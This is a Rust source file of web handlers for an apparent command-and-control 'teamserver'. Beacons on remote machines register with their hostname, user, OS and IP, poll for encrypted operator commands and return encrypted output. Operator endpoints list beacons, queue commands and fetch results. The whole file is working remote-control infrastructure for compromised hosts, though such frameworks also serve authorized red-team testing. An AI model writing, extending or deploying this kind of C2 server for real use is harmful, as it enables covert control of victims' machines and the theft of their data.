// HTTP handlers for teamserver API endpoints

use axum::{
    extract::{Path, State},
    http::StatusCode,
    response::Json,
};
use serde_json::json;
use tracing::{info, warn, error};

use crate::{AppState, BeaconCheckin, BeaconOutput, Command, OperatorCommand};

/// Handle beacon check-in (initial registration)
pub async fn beacon_checkin(
    State(state): State<AppState>,
    Path(beacon_id): Path<String>,
    Json(payload): Json<BeaconCheckin>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    info!("Beacon check-in: {}", beacon_id);

    // Extract system info if encrypted data provided
    let mut hostname = payload.hostname;
    let mut username = payload.username;
    let mut os = payload.os;
    let mut ip = payload.ip;

    if let Some(encrypted_data) = &payload.data {
        match crate::crypto::decrypt(&state.crypto_key, encrypted_data) {
            Ok(decrypted) => {
                // Parse JSON system info
                if let Ok(info) = serde_json::from_slice::<serde_json::Value>(&decrypted) {
                    hostname = info.get("hostname").and_then(|v| v.as_str()).map(String::from);
                    username = info.get("username").and_then(|v| v.as_str()).map(String::from);
                    os = info.get("os").and_then(|v| v.as_str()).map(String::from);
                    ip = info.get("ip").and_then(|v| v.as_str()).map(String::from);

                    info!("System info: {:?}", info);
                }
            }
            Err(e) => {
                warn!("Failed to decrypt beacon data: {}", e);
            }
        }
    }

    // Register beacon in database
    match state.db.register_beacon(
        &beacon_id,
        hostname,
        username,
        os,
        ip,
    ).await {
        Ok(_) => {
            info!("Beacon {} registered successfully", beacon_id);
            Ok(Json(json!({
                "status": "success",
                "message": "Beacon registered",
                "beacon_id": beacon_id
            })))
        }
        Err(e) => {
            error!("Database error: {}", e);
            Err(StatusCode::INTERNAL_SERVER_ERROR)
        }
    }
}

/// Get pending commands for a beacon
pub async fn get_commands(
    State(state): State<AppState>,
    Path(beacon_id): Path<String>,
) -> Result<Json<Vec<Command>>, StatusCode> {
    // Update last seen timestamp
    if let Err(e) = state.db.update_beacon_lastseen(&beacon_id).await {
        warn!("Failed to update beacon last seen: {}", e);
    }

    // Retrieve pending commands
    match state.db.get_pending_commands(&beacon_id).await {
        Ok(cmd_records) => {
            let commands: Vec<Command> = cmd_records
                .into_iter()
                .map(|rec| {
                    // Mark as executed
                    let db = state.db.clone();
                    let cmd_id = rec.id.clone();
                    tokio::spawn(async move {
                        let _ = db.mark_command_executed(&cmd_id).await;
                    });

                    Command {
                        command_id: rec.id,
                        command_type: rec.command_type,
                        command_data: rec.command_data,
                        metadata: None,
                    }
                })
                .collect();

            if !commands.is_empty() {
                info!("Delivering {} command(s) to beacon {}", commands.len(), beacon_id);
            }

            Ok(Json(commands))
        }
        Err(e) => {
            error!("Database error: {}", e);
            Err(StatusCode::INTERNAL_SERVER_ERROR)
        }
    }
}

/// Receive output from beacon
pub async fn beacon_output(
    State(state): State<AppState>,
    Path(beacon_id): Path<String>,
    Json(payload): Json<BeaconOutput>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    info!("Received output from beacon: {}", beacon_id);

    // Extract command_id and status from metadata
    let command_id = payload.metadata
        .as_ref()
        .and_then(|m| m.get("command_id"))
        .and_then(|v| v.as_str())
        .map(String::from);

    let status = payload.metadata
        .as_ref()
        .and_then(|m| m.get("status"))
        .and_then(|v| v.as_str())
        .unwrap_or("success");

    // Decrypt output data
    let decrypted_output = match crate::crypto::decrypt(&state.crypto_key, &payload.data) {
        Ok(data) => String::from_utf8_lossy(&data).to_string(),
        Err(e) => {
            warn!("Failed to decrypt output: {}", e);
            format!("ERROR: Decryption failed: {}", e)
        }
    };

    info!("Output preview: {}...", &decrypted_output.chars().take(100).collect::<String>());

    // Store output in database
    match state.db.store_output(&beacon_id, command_id, &decrypted_output, status).await {
        Ok(_) => {
            Ok(Json(json!({
                "status": "success",
                "message": "Output stored"
            })))
        }
        Err(e) => {
            error!("Database error: {}", e);
            Err(StatusCode::INTERNAL_SERVER_ERROR)
        }
    }
}

/// List all beacons (operator endpoint)
pub async fn list_beacons(
    State(state): State<AppState>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    match state.db.list_beacons().await {
        Ok(beacons) => {
            Ok(Json(json!({
                "count": beacons.len(),
                "beacons": beacons
            })))
        }
        Err(e) => {
            error!("Database error: {}", e);
            Err(StatusCode::INTERNAL_SERVER_ERROR)
        }
    }
}

/// Submit command to beacon (operator endpoint)
pub async fn submit_command(
    State(state): State<AppState>,
    Json(payload): Json<OperatorCommand>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    info!("Operator submitting command to beacon: {}", payload.beacon_id);
    info!("Command type: {}, data: {}...", payload.command_type, &payload.command_data.chars().take(50).collect::<String>());

    // Encrypt command data
    let encrypted_data = match crate::crypto::encrypt(&state.crypto_key, payload.command_data.as_bytes()) {
        Ok(enc) => enc,
        Err(e) => {
            error!("Encryption failed: {}", e);
            return Err(StatusCode::INTERNAL_SERVER_ERROR);
        }
    };

    // Store command in database
    match state.db.create_command(&payload.beacon_id, &payload.command_type, &encrypted_data).await {
        Ok(command_id) => {
            info!("Command {} queued for beacon {}", command_id, payload.beacon_id);
            Ok(Json(json!({
                "status": "success",
                "command_id": command_id,
                "message": "Command queued"
            })))
        }
        Err(e) => {
            error!("Database error: {}", e);
            Err(StatusCode::INTERNAL_SERVER_ERROR)
        }
    }
}

/// Get outputs for a beacon (operator endpoint)
pub async fn get_outputs(
    State(state): State<AppState>,
    Path(beacon_id): Path<String>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    match state.db.get_outputs(&beacon_id).await {
        Ok(outputs) => {
            Ok(Json(json!({
                "count": outputs.len(),
                "outputs": outputs
            })))
        }
        Err(e) => {
            error!("Database error: {}", e);
            Err(StatusCode::INTERNAL_SERVER_ERROR)
        }
    }
}
